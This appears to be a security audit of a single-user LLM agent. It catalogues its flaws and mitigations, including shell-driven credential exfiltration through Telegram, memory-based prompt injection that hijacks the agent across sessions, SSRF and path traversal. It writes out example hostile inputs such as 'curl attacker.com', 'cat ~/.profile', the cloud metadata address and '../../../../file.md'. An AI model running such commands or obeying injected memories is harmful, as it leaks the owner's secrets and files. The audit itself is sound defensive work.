# Trinity Agent — Security Audit

**Date:** 2026-04-13
**Status:** Documented, not yet mitigated
**Rationale:** Hardening these now would hobble agent capability. Revisit when moving to multi-user or public deployment.

---

## Critical

### CRIT-1: Unrestricted shell execution via `run_command`
- **File:** `tools/shell.py:31`
- **Risk:** LLM can run any command — `cat ~/.profile`, `env`, `curl attacker.com`. Full credential exfiltration in one turn.
- **Mitigation options:** Command allowlist, env scrubbing, container sandbox, or credential-aware output filter.

### CRIT-2: `run_command` + `send_telegram` = complete exfil chain
- **File:** `tools/shell.py`, `tools/telegram_tools.py`
- **Risk:** LLM reads secrets via shell, sends to any configured Telegram group.
- **Mitigation:** Restrict `send_telegram` content length, scan for credential patterns before sending, or remove `send_telegram` from builder tools.

## High

### HIGH-1: Prompt injection via memory
- **File:** `app.py:124-129`
- **Risk:** Recalled memories injected into system prompt unsanitized. A malicious memory can break out of `<active_memory>` tags and hijack the agent persistently across sessions.
- **Mitigation:** Escape `</active_memory>` in recalled content, or inject as structured JSON instead of raw text.

### HIGH-2: Git flag injection via `git_diff`
- **File:** `tools/git.py:34-37`
- **Risk:** LLM passes `--output=/arbitrary/path` to write files anywhere.
- **Mitigation:** Allowlist safe flags (`--stat`, `--staged`, `--name-only`, `HEAD~N`).

### HIGH-3: SSRF via `web_fetch`
- **File:** `tools/web.py:27`
- **Risk:** No URL validation. LLM can hit `169.254.169.254` (cloud metadata), `localhost`, internal services.
- **Mitigation:** Enforce `https://` only, reject RFC 1918 + link-local IPs.

### HIGH-4: Workspace file exfiltration via `read_file` + `send_telegram`
- **File:** `tools/filesystem.py`, `tools/telegram_tools.py`
- **Risk:** LLM reads any in-workspace file and sends content to Telegram.
- **Mitigation:** Credential pattern scanning on outbound messages.

### HIGH-5: `action_timeout` never enforced
- **File:** `agents/base.py:110`
- **Risk:** Agent loop runs unbounded. 30 turns x 120s shell timeout = 60min per message.
- **Mitigation:** Wrap `run_agent` in `concurrent.futures` with wall-clock deadline.

## Medium

### MED-1: Path traversal via symlink prefix confusion
- **File:** `tools/filesystem.py:15-23`
- **Risk:** `startswith` check can be fooled if workspace path is a prefix of another directory.
- **Mitigation:** Use `resolved.is_relative_to(ws)` (Python 3.9+) instead of string `startswith`.

### MED-2: Memory ID path injection
- **File:** `memory/store.py:95-110`
- **Risk:** Unvalidated memory ID used as filename — `../../../../file.md` could delete arbitrary `.md` files.
- **Mitigation:** Validate against `^mem_\d{8}_\d{3}$` pattern.

## Context

Trinity runs as a single-user agent on TJ's personal server. The only Telegram users with access are allowlisted by user ID. The LLM is not adversarial by default — these risks materialize through prompt injection (malicious user messages or poisoned memories). Current risk profile is acceptable for personal use. Revisit before any multi-user, public, or cloud deployment.
